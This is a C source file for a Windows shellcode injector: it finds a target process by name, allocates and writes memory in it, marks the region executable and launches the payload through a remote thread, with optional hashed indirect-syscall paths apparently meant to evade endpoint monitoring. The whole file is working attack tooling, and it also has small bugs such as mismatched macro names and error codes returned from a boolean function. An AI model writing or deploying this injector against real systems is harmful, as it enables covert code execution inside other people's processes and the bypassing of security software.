#include "injection.h"


BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellcode, SIZE_T sPayloadSize) {
    PVOID		pShellcodeAddress			= NULL;
	SIZE_T		sOriginalSize				= sPayloadSize;
	SIZE_T		sNumberOfBytesWritten		= NULL;
    DWORD		dwProcessId				    = NULL;
	DWORD		dwOldProtection				= NULL;
	NTSTATUS	status						= NULL;
	HANDLE		hThread						= NULL;

    WDebugPrint(L"[i] Searching For Process Id Of \"%s\" ...\n", szProcessName);
#ifdef SYSCALL_ENABLED
	if (!indirectGetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		DebugPrint("[!] Process is Not Found \n");
		return -1;
	}
#else
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		DebugPrint("[!] Process is Not Found \n");
		return -1;
	}
#endif
	DebugPrint("[+] DONE\n");
	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);
	DebugPrint("[i] Target process handle: 0x%p\n", hProcess);

	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
#ifdef HW_INDIRECT_SYSCALL
	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
	
	if (!pNtAllocateVirtualMemory) {
		DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
		return -2; // Error code
	}
	if ((status = pNtAllocateVirtualMemory(hProcess, &pShellcodeAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pShellcodeAddress == NULL) {
		DebugPrint("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", status);
		return -1;
	}
#else
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		DebugPrint("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#endif
	DebugPrint("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
#ifdef HW_INDIRECT_SYSCALL
	NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)PrepareSyscallHash(NtWriteVirtualMemory_JOAA);
	
	if (!pNtWriteVirtualMemory) {
		DebugPrint("[-] Failed to prepare syscall for NtWriteVirtualMemory.\n");
		return -2; // Error code
	}

	status = pNtWriteVirtualMemory(hProcess, pShellcodeAddress, pShellcode, sPayloadSize, &sNumberOfBytesWritten);

	if (!NT_SUCCESS(status) || sNumberOfBytesWritten != sPayloadSize) {
		DebugPrint("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", status);
		return -1;
	}
#else
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sPayloadSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sPayloadSize) {
		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#endif
	DebugPrint("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	// Cleaning the buffer of the shellcode in the local process
	memset(pShellcode, '\0', sOriginalSize);

	// Setting memory permossions at pShellcodeAddress to be executable
#ifdef HW_INDIRECT_SYSCALL
	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
    
    if (!pNtProtectVirtualMemory) {
        DebugPrint("[-] Failed to prepare syscall for NtProtectVirtualMemory.\n");
        return -2;
    }

	status = pNtProtectVirtualMemory(hProcess, &pShellcodeAddress, &sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection);
    DebugPrint("[+] NtProtectVirtualMemory result: %d\n", status);

	if (!NT_SUCCESS(status)) {
		DebugPrint("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#else
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#endif

	// Running the shellcode as a new thread's entry in the remote process
	DebugPrint("[i] Executing Payload ... ");
#ifdef HW_INDIRECT_SYSCALLS
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
	
	if (!pNtCreateThreadEx) {
		DebugPrint("[-] Failed to prepare syscall for NtCreateThreadEx.\n");
		return -2; // Error code
	}
	if ((status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) || status == NULL) {
		DebugPrint("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", status);
		return -1;
	}
#else
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		DebugPrint("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
#endif
	DebugPrint("[+] DONE !\n");

	return TRUE;
}